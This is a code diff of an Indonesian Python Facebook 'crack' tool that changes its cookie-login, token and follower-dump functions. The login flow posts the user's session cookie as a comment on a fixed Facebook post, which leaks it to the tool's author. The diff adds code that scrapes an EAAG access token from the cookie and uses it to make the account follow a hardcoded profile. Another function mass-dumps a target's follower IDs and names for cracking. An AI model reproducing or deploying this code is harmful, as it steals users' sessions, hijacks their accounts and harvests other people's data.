@@ -1025,9 +1025,9 @@ def logincoki():
 					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
 					open('.fantoken.txt','w').write(token)
 					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
-					bot_follow()
-					requests.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={token}')
-					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
+					generate_token_eaag(cok)
+					#requests.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={token}')
+					#requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
 					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={token}", headers={"cookie": cok})
 					bot_komen(cok, token)
 					
@@ -1037,67 +1037,18 @@ def logincoki():
 		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
 		sleep(2);exit()
 	except Exception as e:os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt');print(e);exit()
-
-
-def logincokii() -> None:
-    cookie = Console().input(f" {H2}• {P2}cookie : ")
-    try:
-        # Update headers untuk request
-        ses.headers.update({
-            "Accept-Language": "id,en;q=0.9",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-            "Referer": "https://www.instagram.com/",
-            "Host": "www.facebook.com",
-            "Sec-Fetch-Mode": "cors",
-            "Accept": "*/*",
-            "Connection": "keep-alive",
-            "Sec-Fetch-Site": "cross-site",
-            "Sec-Fetch-Dest": "empty",
-            "Origin": "https://www.instagram.com",
-            "Accept-Encoding": "gzip, deflate",
-        })
-
-        # Melakukan request untuk mendapatkan token
-        link = ses.get(
-            "https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/",
-            cookies={"cookie": cookie}
-        )
-
-        # Memeriksa apakah ada access_token dalam header
-        if '"access_token":' in str(link.headers):
-            token = re.search('"access_token":"(.*?)"', str(link.headers)).group(1)
-
-            # Menyimpan cookie dan token ke dalam file
-            with open(".fancookie.txt", "w") as cok_file:
-                cok_file.write(cookie)
-            with open(".fantoken.txt", "w") as tok_file:
-                tok_file.write(token)
-
-            # Mengirim request dengan token yang didapatkan
-            requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
-            bot_komen(cookie, token)
-            bot_follow(cookie, token)
-		
-            # Menampilkan token di konsol
-            Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
-            Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
-            exit()
-    except requests.exceptions.RequestException as e:
-        # Menangani error dari request
-        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa Bang")
-        # Menghapus file menggunakan os.remove
-        os.remove(".fantoken.txt")
-        os.remove(".fancookie.txt")
-        print(e)
-        time.sleep(3)
-        exit()
-
-    except Exception as e:
-        # Menangani kesalahan umum lainnya
-        Console().print(f" {H2}• {P2}[bold red]Terjadi kesalahan: {e}")
-        time.sleep(3)
-        exit()
-
+# --------------------[ BAGIAN-COOKIE-EAAG ]--------------#
+def generate_token_eaag(cok):
+	cookie = cok
+	ses.headers.update({'cookie': cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'business.facebook.com'})
+	response3 = ses.get('https://business.facebook.com/business_locations').text
+	coli = re.search(r'(EAAG\w+)', str(response3)).group(1)
+	#Console().print(Panel(f"{P2}{coli}", width=60, style=f"{color_panel}", title="[bold green]TOKEN EAAG"))
+	# Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
+	open('.fantokeneaag.txt','w').write(coli)
+	bot_follow()
+	#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
+	exit()
 # --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
 def bot_komen(cok, ken):
 	with requests.Session() as r:
@@ -1111,7 +1062,7 @@ def bot_komen(cok, ken):
 # ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
 def bot_follow():
 	with requests.Session() as r:
-		toket = open('.fantoken.txt','r').read()
+		toket = open('.fantokeneaag.txt','r').read()
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
 
 # -----------------[Rahasia Negara]-------------------#
@@ -1181,10 +1132,11 @@ def menu():
     try:
         token = open(".fantoken.txt", "r").read()
         cookie = open(".fancookie.txt", "r").read()
+        eaag = open(".fantokeneaag.txt", "r").read()
         tokenku.append(token)
     except IOError:
         Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
-        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
+        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt && rm -rf .fantokeneaag.txt")
         time.sleep(3)
         login()
     try:
@@ -1248,34 +1200,44 @@ def menu():
     	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")
 
 
+import os
+import requests
+import json
+import sys
+
 def followers():
     try:
         os.mkdir('dump')
-    except: pass
+    except:
+        pass
+
     try:
-        console.print(f"\n {H2}• {P2}Ketik 'me' jika ingin dump followers sendiri")
-        idcuy = console.input(f" {H2}• {P2}Target id : ")
-        # batas = console.input(f" {H2}• {P2}Maksimal id : ")
+        idcuy = input(" • Target ID : ")
         fantok = open(".fantoken.txt", "r").read()
+
+        # Ambil informasi nama target
         gas = requests.get(f'https://graph.facebook.com/{idcuy}?access_token={fantok}')
         nm = json.loads(gas.text)
-        file = f'dump/{nm["first_name"]}.json'.replace(' ', '_')
-        bff = open(file, 'w')
+        file = f'dump/{nm['first_name']}.json'.replace(' ', '_')
+
+        # Coba ambil daftar followers (TIDAK BERFUNGSI untuk akun pribadi)
         r = requests.get(f'https://graph.facebook.com/{idcuy}/subscribers?limit=50000&access_token={fantok}')
         z = json.loads(r.text)
-        for a in z['data']:
-            id.append(a['id'] + '|' + a['name'])
-            bff.write(a['id'] + '|' + a['name'] + '\n')
-            print(f'\r • mengumpulkan id : {len(id)}', end='')
-            sys.stdout.flush()
-            jeda(0.0050)
-        bff.close()
-        console.print(f"\n\n {H2}• {P2}Succes dump id dari {nm["name"]}")
-        # console.print(f" {H2}• {P2}File dump tersimpan : {file}")
-        # console.input(f" {H2}• {P2} [enter]")
+
+        # Simpan hasil ke file
+        with open(file, 'w') as bff:
+            for a in z.get('data', []):
+                bff.write(f"{a['id']}|{a['name']}\n")
+                print(f"\r • Mengumpulkan ID: {len(z['data'])}", end='')
+                sys.stdout.flush()
+        
+        print(f"\n\n • Berhasil dump ID dari {nm['name']}")
+        
+        # Langsung masuk ke setting() setelah selesai
         setting()
+        
     except Exception as e:
-        console.print(f"\n {H2}• {P2} Gagal Dump Id ")
+        print("\n • Gagal Dump ID")
         exit()
 
 #----------[ CRACK-PUBLIK  ]----------#
